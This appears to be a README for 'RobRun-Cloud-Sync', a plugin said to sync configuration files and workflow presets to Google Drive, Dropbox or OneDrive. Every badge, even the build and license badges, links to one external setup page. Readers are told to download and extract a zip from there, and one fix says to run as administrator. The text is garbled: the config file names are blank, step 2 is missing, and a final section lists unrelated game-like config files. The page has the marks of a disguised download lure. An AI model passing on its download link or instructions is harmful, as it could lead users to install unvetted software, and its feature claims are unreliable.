# RobRun-Cloud-Sync – Structured Cloud Synchronization for RobRun

> **TL;DR**: RobRun‑Cloud‑Sync is a lightweight companion that synchronizes configuration files and workflow presets across cloud services, enabling seamless cross‑platform access without manual transfers.

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-16a34a?style=for-the-badge&logo=android&logoColor=white" alt="Download">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Build-Passing-4c1?style=flat-square&logo=github&logoColor=white" alt="Build">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Size-42KB-0052cc?style=plastic&logo=zip" alt="Size">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/License-Apache%202.0-blue?style=flat&logo=apache&logoColor=white" alt="License">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Platform-Android%20%7C%20Windows%20%7C%20macOS-ff69b4?style=for-the-badge&logo=platformio" alt="Platform">
  </a>
</div>

---

## What Is RobRun‑Cloud‑Sync?

RobRun‑Cloud‑Sync bridges the gap between local configuration and cloud storage for the RobRun ecosystem. It watches the `config/` directory, picks up ``, ``, ``, and ``, and pushes or pulls the latest versions from a chosen provider (Google Drive, Dropbox, OneDrive). In addition, it manages **workflow presets**—pre‑defined sequences of actions that users can activate with a single tap. This eliminates the need for manual file copying, guarantees version consistency, and keeps all devices on the same playbook.

---

## Core Features

| Feature | Description | Benefit |
|---------|-------------|---------|
| **Real‑time Sync** | Detects file changes and uploads immediately. | No stale configurations. |
| **Multi‑cloud Support** | Plug‑and‑play with Google Drive, Dropbox, OneDrive, or custom WebDAV. | Flexibility to choose any provider. |
| **Preset Management** | Stores and distributes workflow presets (`preset_*.cfg`). | One‑click activation across devices. |
| **Conflict Resolution** | Timestamp‑based merge with optional manual override. | Prevents accidental data loss. |
| **Lightweight UI** | Minimalist overlay that shows sync status and error alerts. | Low overhead, no intrusive dialogs. |
| **Security** | Uses OAuth 2.0 for authentication and AES‑256 encryption for local cache. | Protects sensitive settings. |

---

## Architecture Overview

RobRun‑Cloud‑Sync is split into three logical layers:

1. **File Monitor** – A file‑system watcher that triggers on `modified`, `created`, or `deleted` events for the four configuration files and any preset files.
2. **Sync Engine** – Handles authentication, encryption, and API calls to the cloud provider. It keeps an in‑memory index of the cloud state and resolves conflicts before uploading or downloading.
3. **User Interface** – A small floating widget that displays a status icon (✓, ⚠, or ✖), a brief tooltip, and a settings panel. Users can toggle auto‑sync, switch providers, or manually trigger a sync.

The engine uses a JSON manifest (`manifest.json`) to record the last synced hash of each file, ensuring that only changed data is transmitted.

---

## Getting Started

### 1. Installation

Download the latest bundle from the **Download** button above and extract the `RobRun-Cloud-Sync.zip` into the `plugins/` folder of your RobRun installation. The plugin will register automatically on the next launch.

### 3. Managing Presets

Preset files follow the pattern `preset_<name>.cfg`. Place any new preset in the `presets/` directory and the engine will push it to the cloud. Users can activate a preset via the overlay menu or by importing it into RobRun’s own preset manager.

---

## Directory Layout

```
RobRun-Cloud-Sync/
├─ config/
│  ├─
│  ├─
│  ├─
│  └─
├─ presets/
│  ├─
│  └─
├─ logs/
│  └─ sync.log
├─ manifest.json
└─ README.md
```

- `config/` – Local copies of the main configuration files.
- `presets/` – Folder for workflow preset files.
- `logs/` – Verbose logging output for troubleshooting.
- `manifest.json` – Stores hashes and timestamps for conflict detection.

---

## Troubleshooting & FAQ

| Issue | Diagnosis | Fix |
|-------|-----------|-----|
| **Sync never starts** | Provider not authenticated or folder path incorrect. | Re‑open settings, reconnect, and confirm folder path. |
| **File conflicts** | Two devices modified the same file at similar times. | Manual merge: open both versions in a text editor and merge changes, then save. |
| **Large files lag** | Cloud API rate limits. | Enable *Low‑Bandwidth Mode* in settings or switch to a provider with higher limits. |
| **Error: “Permission denied”** | Local file permissions blocked by OS. | Run RobRun as administrator or adjust folder permissions to allow read/write. |
| **Overlay missing** | UI disabled in settings. | Enable *Show Overlay* under UI options. |

---

## Contributing

Feel free to open issues or submit pull requests. When proposing a new feature, include:

- A concise description of the problem it solves.
- Unit tests that cover edge cases.
- Documentation updates that explain the new behavior.

All contributions must comply with the existing coding style and be accompanied by a clear commit message.

---

## License

RobRun‑Cloud‑Sync is licensed under the Apache 2.0 License. See the included `LICENSE` file for details.

---

## Contact

For support, reach out to the maintainer on the official forum or open an issue on GitHub. Happy syncing!

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```